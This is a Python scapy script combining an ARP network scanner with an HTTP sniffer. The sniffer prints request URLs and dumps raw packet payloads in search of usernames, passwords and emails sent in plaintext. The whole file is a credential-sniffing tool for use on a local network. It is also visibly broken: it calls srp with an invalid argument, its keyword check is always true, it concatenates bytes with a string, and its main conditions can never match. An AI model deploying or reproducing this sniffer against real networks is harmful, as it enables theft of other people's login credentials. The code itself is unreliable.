import scapy.all as scapy
from scapy.layers import http
import argparse

def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP / IP range")
    parser.add_argument("-i", "--interface", dest="interface", help="Target Interface")
    arguments = parser.parse_args()
    return arguments

def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_request
    welcomed = scapy.srp(arp_broadcast, timeout=3, dest="target", verbose=False)[0]
    
    client_list = [] #to create a dictionary of ip and mac address to store the values
    
    for element in welcomed:
        ip_addr = element[1].psrc
        mac_addr = element[1].hwsrc
        client_dict = {"ip": ip_addr, "Mac": mac_addr}
        client_list.append(client_dict)
    return client_list

def print_result(result_list):
    print("IP\t\t\tMac Address\n- - - - - - - - - - - - - - - -")
    for client in result_list:
        print(client["ip"] + "\t\t" + client["Mac"]) 
        
def sniff(arguments):
    scapy.sniff(iface=arguments, store=False, prn=process_sniffed_packet)
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] Http Request >> " + url)
        if packet.haslayer(scapy.Raw):
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key:
                    print("[+] Passwords and Username >>" + packet[scapy.Raw].load)
                    break


arguments = parse()    


if arguments == "wlan0":
    sniff(arguments.interface)
if arguments == "result":
    result = scan(arguments.target)
    print_result(result)
  	